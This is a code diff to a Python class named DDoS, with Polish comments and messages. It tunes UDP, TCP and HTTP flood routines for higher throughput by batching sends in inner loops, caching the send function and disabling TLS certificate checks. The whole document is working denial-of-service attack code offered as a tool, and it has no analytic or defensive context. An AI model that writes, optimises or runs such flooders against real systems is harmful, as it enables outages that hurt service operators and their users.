@@ -21,46 +21,57 @@ class DDoS:
 
     def udp_flood(self):
         client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payload = self.generate_payload()
-        while time.time() < self.timeout and not self.stop_event.is_set():
-            try:
-                client.sendto(payload, (self.target_ip, self.target_port))
-            except:
-                pass
+        payload = self.generate_payload(1024)
+        target = (self.target_ip, self.target_port)
+        sendto = client.sendto # Optymalizacja (lokalne cache'owanie funkcji)
+        
+        while not self.stop_event.is_set() and time.time() < self.timeout:
+            # Wewnetrzna petla zeby nie obciazac procesora sprawdzaniem czasu
+            for _ in range(100):
+                try:
+                    sendto(payload, target)
+                except:
+                    pass
         client.close()
 
     def tcp_flood(self):
         payload = self.generate_payload(512)
-        while time.time() < self.timeout and not self.stop_event.is_set():
-            try:
-                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                client.settimeout(1)
-                client.connect((self.target_ip, self.target_port))
-                client.send(payload)
-                client.close()
-            except:
-                pass
+        target = (self.target_ip, self.target_port)
+        
+        while not self.stop_event.is_set() and time.time() < self.timeout:
+            for _ in range(10):
+                try:
+                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    client.settimeout(1)
+                    client.connect(target)
+                    client.send(payload)
+                    client.close()
+                except:
+                    pass
 
     def http_flood(self):
-        while time.time() < self.timeout and not self.stop_event.is_set():
-            try:
-                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                client.settimeout(1)
-                client.connect((self.target_ip, self.target_port))
-                
-                user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"]
-                request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n"
-                
-                if self.target_port == 443:
-                    context = ssl.create_default_context()
-                    context.check_hostname = False
-                    context.verify_mode = ssl.CERT_NONE
-                    client = context.wrap_socket(client, server_hostname=self.target_ip)
-                
-                client.send(request.encode())
-                client.close()
-            except:
-                pass
+        target = (self.target_ip, self.target_port)
+        user_agents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"]
+        
+        while not self.stop_event.is_set() and time.time() < self.timeout:
+            for _ in range(10):
+                try:
+                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    client.settimeout(1)
+                    client.connect(target)
+                    
+                    request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n"
+                    
+                    if self.target_port == 443:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        client = context.wrap_socket(client, server_hostname=self.target_ip)
+                    
+                    client.send(request.encode())
+                    client.close()
+                except:
+                    pass
 
     def run(self):
         print(f"[*] Atakuje ({self.method}) {self.target_ip}:{self.target_port} na {self.threads} watkach!")
